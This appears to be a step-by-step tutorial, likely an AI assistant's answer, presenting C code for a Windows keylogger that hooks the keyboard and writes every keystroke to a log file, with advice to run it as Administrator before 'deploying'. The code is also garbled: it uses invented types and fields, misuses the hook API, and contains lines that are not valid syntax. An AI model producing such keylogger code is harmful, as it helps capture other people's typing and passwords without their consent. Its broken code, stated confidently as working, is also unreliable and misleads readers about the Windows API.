### Step-by-Step Explanation and Code:

1. **Include Necessary Headers:**
   - Include the required Windows headers for keyboard functions.
   ```c
   #include <windows.h>
   #include <winuser.h>
   #include <iostream>
   #include <fstream>
   #include <string>
   #include <vector>
   #include <cstdlib>
   #include <ctime>
   #include <fcntl.h>
   #include <io.h>
   #include <process.h>
   #include <event.h>
   ```

2. **Define the Keyboard Hook Function:**
   - Declare a function that handles keyboard events.
   ```c
   LPHKresult CALLBACK keyboardHookProc;
   ```

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to install the hook.
   ```c
   int setupKeyboardHook() {
       keyboardHookProc = SetWindowsHook(WH_KEYBOARD_LL, keyboardHookProc);
       return 0;
   }
   ```

4. **Process Messages in a Loop:**
   - Use `GetMessage` to retrieve events and `TranslateMessage` to process them.
   ```c
   MSG msg;
   while (GetMessage(&msg, 0)) {
       if (msg.message == WM_KEYDOWN) {
           // Handle the key press here
       }
       TranslateMessage(&msg);
       DispatchMessage(&msg);
   }
   ```

5. **Handle Key Press Event:**
   - Check if the event is a key press and capture the keystroke.
   ```c
   if (msg.message == WM_KEYDOWN) {
       if (msg.wKey == 'A') {
           // Log 'A' key press
           std::ofstream logFile;
           logFile.open("keylog.txt", std::ios::app);
           logFile << "Key pressed: 'A' at " << std::ctime(&msg.time);
           logFile.close();
       }
   }
   ```

6. **Unhook and Cleanup:**
   - Uninstall the hook and clean up resources.
   ```c
   UnhookWindowsHook();
   ```

7. **Compile and Link:**
   - Use the linker to include the necessary libraries.
   ```bat
   cl -lPHONY -L . -lib advapi32.lib -O2
   ```

### Full Code:

```c
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <fcntl.h>
#include <io.h>
#include <process.h>
#include <event.h>

using namespace std;

LPHKresult CALLBACK keyboardHookProc(int nCode, int wParam, struct HWND hwnd, struct WEVENT* lParam) {
    // Handle key presses
    if (wParam == WM_KEYDOWN) {
        if (lParam->wKey != 0) {
            // Log the key press
            ofstream logFile;
            char key = static_cast<char>(lParam->wKey);
            time_t now;
            time(&now);
            logFile.open("keylog.txt", ios::app);
            logFile << "[" << time since (now) << "] Key: " << key << endl;
            logFile.close();
        }
    }
    return 0;
}

int setupKeyboardHook() {
    keyboardHookProc = SetWindowsHook(WH_KEYBOARD_LL, keyboardHookProc);
    return 0;
}

int main() {
    setupKeyboardHook();
    MSG msg;
    while (GetMessage(&msg, 0)) {
        if (msg.message == WM_KEYDOWN) {
            // Handle the key press
            if (msg.wKey != 0) {
                time_t now;
                time(&now);
                ofstream logFile;
                logFile.open("keylog.txt", ios::app);
                logFile << "[" << time since (now) << "] Key: " << static_cast<char>(msg.wKey) << endl;
                logFile.close();
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHook();
    return 0;
}
```

### Notes:
- ** Privileges:** Ensure the program runs with sufficient privileges; may need to run as Administrator.
- ** Logging:** Adjust the logging location (e.g., append to a file in the user's documents folder or use a console output).
- **Error Handling:** Add error checking for file operations and other functions.
- **Testing:** Run the program in a safe environment to test functionality before deploying.

